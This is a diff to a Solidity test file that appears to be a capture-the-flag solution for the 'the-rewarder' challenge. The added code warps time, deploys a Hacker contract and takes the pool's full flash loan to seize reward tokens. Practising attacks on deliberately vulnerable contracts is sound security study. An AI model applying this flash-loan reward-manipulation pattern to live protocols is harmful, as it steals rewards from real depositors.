@@ -10,6 +10,8 @@ import {RewardToken} from "../../../src/Contracts/the-rewarder/RewardToken.sol";
 import {AccountingToken} from "../../../src/Contracts/the-rewarder/AccountingToken.sol";
 import {FlashLoanerPool} from "../../../src/Contracts/the-rewarder/FlashLoanerPool.sol";
 
+import "../../../src/Contracts/the-rewarder/Hacker.sol";
+
 contract TheRewarder is Test {
     uint256 internal constant TOKENS_IN_LENDER_POOL = 1_000_000e18;
     uint256 internal constant USER_DEPOSIT = 100e18;
@@ -58,6 +60,7 @@ contract TheRewarder is Test {
             vm.startPrank(users[i]);
             dvt.approve(address(theRewarderPool), USER_DEPOSIT);
             theRewarderPool.deposit(USER_DEPOSIT);
+
             assertEq(theRewarderPool.accToken().balanceOf(users[i]), USER_DEPOSIT);
             vm.stopPrank();
         }
@@ -89,6 +92,30 @@ contract TheRewarder is Test {
          * EXPLOIT START *
          */
 
+        vm.warp(block.timestamp + 5 days); // 5 days
+        vm.startPrank(attacker);
+
+        Hacker hacker;
+        AccountingToken accToken = theRewarderPool.accToken();
+
+
+        hacker = new Hacker(
+            address(flashLoanerPool),
+            address(theRewarderPool),
+            address(accToken),
+            address(dvt),
+            address(attacker)
+        );
+
+        uint maxLoan = dvt.balanceOf(address(flashLoanerPool));
+
+        hacker.askLoan(maxLoan);
+
+        console.log("Number of Reward", address(hacker));
+
+
+        vm.stopPrank();
+
         /**
          * EXPLOIT END *
          */
@@ -106,12 +133,16 @@ contract TheRewarder is Test {
             uint256 delta = rewardPerUser - 25e18;
             assertLt(delta, 1e16);
         }
+
         // Rewards must have been issued to the attacker account
         assertGt(theRewarderPool.rewardToken().totalSupply(), 100e18);
         uint256 rewardAttacker = theRewarderPool.rewardToken().balanceOf(attacker);
 
         // The amount of rewards earned should be really close to 100 tokens
         uint256 deltaAttacker = 100e18 - rewardAttacker;
+
+        console.log("Number of Reward", rewardAttacker );
+        console.log("Before Assert");
         assertLt(deltaAttacker, 1e17);
 
         // Attacker finishes with zero DVT tokens in balance
